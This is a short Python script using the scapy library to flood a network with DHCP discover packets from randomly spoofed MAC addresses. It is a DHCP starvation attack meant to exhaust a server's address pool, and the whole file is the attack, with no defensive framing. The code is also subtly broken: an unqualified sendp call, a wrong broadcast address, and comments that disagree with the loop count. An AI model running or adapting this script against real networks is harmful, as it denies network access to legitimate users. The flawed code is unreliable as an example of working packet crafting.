# import the libary and rename it
import scapy.all as sc 
print("300 dhcp discover packet are being sent with fake source mac address...")
# loop 1000 time, sent 1000 dhcp dicover
for i in range(300 + 1):
    # generate random mac address
    mac_address = sc.RandMAC()
    # create dhcp request packet
    etternet = sc.Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")  
    ip = sc.IP(src="0.0.0.0", dst="255.255.255.0")  
    udp = sc.UDP(sport=68, dport=67)  
    bootp = sc.BOOTP(op=1, chaddr=mac_address)
    dhcp = sc.DHCP(options=[("message-type", "discover"), ("end")])
    pkt = etternet / ip / udp / bootp / dhcp
    sendp(pkt,iface='eth0', verbose=0)
print("script finish.")
